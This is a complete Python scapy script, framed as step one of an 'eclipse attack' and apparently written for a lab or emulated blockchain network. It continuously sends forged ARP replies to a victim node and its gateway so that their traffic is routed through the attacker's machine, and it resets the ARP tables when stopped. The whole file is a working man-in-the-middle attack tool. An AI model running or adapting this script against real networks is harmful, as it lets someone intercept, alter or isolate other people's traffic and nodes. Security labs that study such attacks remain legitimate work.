#!/usr/bin/env python3
"""
ARP Spoofer - Eclipse Attack Part 1, Step 1
Poisons ARP tables of the victim (10.160.0.71) and the router (10.160.0.254)
so all traffic flows through us (attacker at 10.160.0.72).
"""

from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import time
import sys

ATTACKER_IP  = "10.160.0.72"
TARGET_IP    = "10.160.0.71"   # Node 0 (BootNode Miner in AS160)
GATEWAY_IP   = "10.160.0.254"  # AS160 router
IFACE        = "net0"

def get_mac(ip):
    from scapy.all import srp
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, iface=IFACE, verbose=False
    )
    if ans:
        return ans[0][1].hwsrc
    raise Exception(f"Could not resolve MAC for {ip}")

def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    """Tell target_ip that spoof_ip is at our MAC."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,                  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    sendp(pkt, iface=IFACE, verbose=False)

def main():
    print("[*] Resolving MACs...")
    attacker_mac = get_if_hwaddr(IFACE)
    target_mac   = get_mac(TARGET_IP)
    gateway_mac  = get_mac(GATEWAY_IP)

    print(f"[*] Attacker  : {ATTACKER_IP} ({attacker_mac})")
    print(f"[*] Target    : {TARGET_IP}  ({target_mac})")
    print(f"[*] Gateway   : {GATEWAY_IP} ({gateway_mac})")
    print("[*] Starting ARP poisoning loop (Ctrl+C to stop)...")

    try:
        while True:
            # Tell the victim:  "the router is at MY mac"
            spoof(TARGET_IP,  GATEWAY_IP, target_mac,  attacker_mac)
            # Tell the router:  "the victim is at MY mac"
            spoof(GATEWAY_IP, TARGET_IP,  gateway_mac, attacker_mac)
            time.sleep(1.5)
    except KeyboardInterrupt:
        print("\n[!] Restoring ARP tables...")
        # Send 5 corrective replies
        for _ in range(5):
            spoof(TARGET_IP,  GATEWAY_IP, target_mac,  gateway_mac)
            spoof(GATEWAY_IP, TARGET_IP,  gateway_mac, target_mac)
        print("[*] Done.")

if __name__ == "__main__":
    main()
